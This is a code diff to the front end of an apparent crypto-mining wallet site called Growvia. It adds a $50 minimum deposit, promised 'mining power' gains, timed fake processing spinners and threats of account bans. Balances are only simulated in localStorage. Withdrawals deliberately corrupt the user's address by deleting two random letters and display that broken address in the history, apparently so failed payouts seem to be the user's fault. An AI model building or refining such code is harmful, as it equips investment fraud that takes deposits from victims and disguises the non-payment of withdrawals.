@@ -565,6 +565,49 @@
             text-align: right;
         }
 
+        /* Loader Styles */
+        .loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        
+        .loader-content {
+            background-color: var(--card-bg);
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: var(--shadow);
+        }
+        
+        .loader-text {
+            margin-top: 15px;
+            font-weight: 600;
+            color: var(--text);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         @media (max-width: 768px) {
             .wallet-actions {
                 flex-direction: column;
@@ -655,7 +698,7 @@
             </div>
             <div class="input-group">
                 <label class="input-label">Amount to Add (USD)</label>
-                <input type="number" class="input-field" id="addAmount" placeholder="Enter amount">
+                <input type="number" class="input-field" id="addAmount" placeholder="Enter amount (minimum $50)">
             </div>
             
             <div class="wallet-address">
@@ -681,7 +724,7 @@
                 <div class="close-modal">&times;</div>
             </div>
             <div class="warning-note">
-                Make sure you have sent the crypto before proceeding to avoid permanent ban of account and loss of mined balance.
+                Make sure you have sent the minimum crypto or above before proceeding to avoid permanent ban of account and loss of mined balance.
             </div>
             <button class="modal-btn warning" id="confirmWarningBtn">I Confirm I've Sent</button>
             <button class="modal-btn secondary close-modal">Cancel</button>
@@ -745,7 +788,7 @@
                 <div class="close-modal">&times;</div>
             </div>
             <div class="success-note">
-                Your USDT will reflect in your wallet within 24 hours. Thank you for using Growvia.
+                Your USDT will reflect in your wallet within 10 minutes. Thank you for using Growvia.
             </div>
             <button class="modal-btn primary close-modal">OK</button>
         </div>
@@ -762,6 +805,14 @@
                 <!-- Notifications will be added here dynamically -->
                 <div class="no-notifications">No notifications yet</div>
             </div>
+        </div>
+    </div>
+
+    <!-- Withdrawal Loader -->
+    <div class="loader-container" id="withdrawalLoader">
+        <div class="loader-content">
+            <div class="loader"></div>
+            <div class="loader-text">Processing Withdrawal...</div>
         </div>
     </div>
 
@@ -814,6 +865,7 @@
         const withdrawModal = document.getElementById('withdrawModal');
         const withdrawSuccessModal = document.getElementById('withdrawSuccessModal');
         const notificationModal = document.getElementById('notificationModal');
+        const withdrawalLoader = document.getElementById('withdrawalLoader');
         const closeModalButtons = document.querySelectorAll('.close-modal');
 
         // Buttons
@@ -925,38 +977,49 @@
 
         // I've Sent Crypto Button
         confirmSentBtn.addEventListener('click', () => {
-            if (!addAmount.value || parseFloat(addAmount.value) <= 0) {
-                alert('Please enter a valid amount');
+            if (!addAmount.value || parseFloat(addAmount.value) < 50) {
+                alert('Minimum amount to add is $50.00');
                 return;
             }
             
             addMoneyModal2.style.display = 'none';
             addMoneyWarningModal.style.display = 'flex';
-        });
-
-        // Confirm Warning Button
-        confirmWarningBtn.addEventListener('click', () => {
-            const amount = parseFloat(addAmount.value);
-            const crypto = cryptoSelect.options[cryptoSelect.selectedIndex].text;
             
-            // Update balance
-            walletBalance += amount;
-            localStorage.setItem('walletBalance', walletBalance);
-            document.getElementById('walletBalance').textContent = `$${walletBalance.toFixed(2)}`;
-            document.getElementById('withdrawBalance').textContent = `$${walletBalance.toFixed(2)}`;
+            // Show loading state
+            confirmWarningBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            confirmWarningBtn.disabled = true;
             
-            // Add transaction
-            addTransaction(`Deposit (${crypto})`, amount, 'positive');
-            
-            // Add notification
-            addNotification('Deposit Received', `Your deposit of $${amount.toFixed(2)} has been added to your wallet.`);
-            
-            // Close modal
-            addMoneyWarningModal.style.display = 'none';
-            
-            // Reset form
-            cryptoSelect.selectedIndex = 0;
-            addAmount.value = '';
+            // Simulate 1 minute delay before balance updates
+            setTimeout(() => {
+                const amount = parseFloat(addAmount.value);
+                const crypto = cryptoSelect.options[cryptoSelect.selectedIndex].text;
+                
+                // Update balance
+                walletBalance += amount;
+                localStorage.setItem('walletBalance', walletBalance);
+                document.getElementById('walletBalance').textContent = `$${walletBalance.toFixed(2)}`;
+                document.getElementById('withdrawBalance').textContent = `$${walletBalance.toFixed(2)}`;
+                
+                // Calculate mining power increase (0.12x per $50)
+                const miningPowerIncrease = Math.floor(amount / 50) * 0.12;
+                
+                // Add transaction
+                addTransaction(`Deposit (${crypto})`, amount, 'positive', '');
+                
+                // Add notification
+                addNotification('Deposit Received', `Your deposit of $${amount.toFixed(2)} has been added to your wallet. Mining power increased by ${miningPowerIncrease.toFixed(2)}x.`);
+                
+                // Close modal
+                addMoneyWarningModal.style.display = 'none';
+                
+                // Reset form
+                cryptoSelect.selectedIndex = 0;
+                addAmount.value = '';
+                
+                // Reset button
+                confirmWarningBtn.innerHTML = 'I Confirm I\'ve Sent';
+                confirmWarningBtn.disabled = false;
+            }, 60000); // 1 minute = 60,000 milliseconds
         });
 
         // Open Withdraw Modal
@@ -995,6 +1058,10 @@
                 return;
             }
             
+            // Show loader
+            withdrawalLoader.style.display = 'flex';
+            withdrawModal.style.display = 'none';
+            
             // Modify address (remove 2 random letters as requested)
             let modifiedAddress = address;
             if (address.length > 2) {
@@ -1008,25 +1075,28 @@
                 modifiedAddress = modifiedAddress.substring(0, pos2) + modifiedAddress.substring(pos2 + 1);
             }
             
-            // Update balance
-            walletBalance -= amount;
-            localStorage.setItem('walletBalance', walletBalance);
-            document.getElementById('walletBalance').textContent = `$${walletBalance.toFixed(2)}`;
-            document.getElementById('withdrawBalance').textContent = `$${walletBalance.toFixed(2)}`;
-            
-            // Add transaction
-            addTransaction('Withdrawal (USDT)', amount, 'negative');
-            
-            // Add notification
-            addNotification('Withdrawal Requested', `Your withdrawal of $${amount.toFixed(2)} has been processed and will be completed within 24 hours.`);
-            
-            // Show success modal
-            withdrawModal.style.display = 'none';
-            withdrawSuccessModal.style.display = 'flex';
-            
-            // Reset form
-            withdrawAmount.value = '';
-            withdrawAddress.value = '';
+            // Simulate processing delay (2 seconds)
+            setTimeout(() => {
+                // Update balance
+                walletBalance -= amount;
+                localStorage.setItem('walletBalance', walletBalance);
+                document.getElementById('walletBalance').textContent = `$${walletBalance.toFixed(2)}`;
+                document.getElementById('withdrawBalance').textContent = `$${walletBalance.toFixed(2)}`;
+                
+                // Add transaction with modified address
+                addTransaction('Withdrawal (USDT)', amount, 'negative', modifiedAddress);
+                
+                // Add notification
+                addNotification('Withdrawal Requested', `Your withdrawal of $${amount.toFixed(2)} has been processed and will be completed within 10 minutes.`);
+                
+                // Hide loader and show success modal
+                withdrawalLoader.style.display = 'none';
+                withdrawSuccessModal.style.display = 'flex';
+                
+                // Reset form
+                withdrawAmount.value = '';
+                withdrawAddress.value = '';
+            }, 9000); // 9 second processing delay
         });
 
         // Open Notification Modal
@@ -1060,12 +1130,13 @@
         });
 
         // Add transaction to history
-        function addTransaction(type, amount, direction) {
+        function addTransaction(type, amount, direction, address = '') {
             const transaction = {
                 type: type,
                 amount: amount,
                 date: new Date().toLocaleString(),
-                direction: direction
+                direction: direction,
+                address: address
             };
             
             transactions.unshift(transaction);
@@ -1086,11 +1157,21 @@
             transactions.forEach(transaction => {
                 const item = document.createElement('div');
                 item.className = 'transaction-item';
-                item.innerHTML = `
+                
+                let detailsHTML = `
                     <div class="transaction-details">
                         <div class="transaction-type">${transaction.type}</div>
                         <div class="transaction-date">${transaction.date}</div>
-                    </div>
+                `;
+                
+                // Show modified address for withdrawals
+                if (transaction.direction === 'negative' && transaction.address) {
+                    detailsHTML += `<div class="transaction-address" style="font-size:0.8rem;color:var(--text);opacity:0.7;">Address: ${transaction.address}</div>`;
+                }
+                
+                detailsHTML += `</div>`;
+                
+                item.innerHTML = detailsHTML + `
                     <div class="transaction-amount ${transaction.direction}">
                         ${transaction.direction === 'positive' ? '+' : '-'}$${transaction.amount.toFixed(2)}
                     </div>
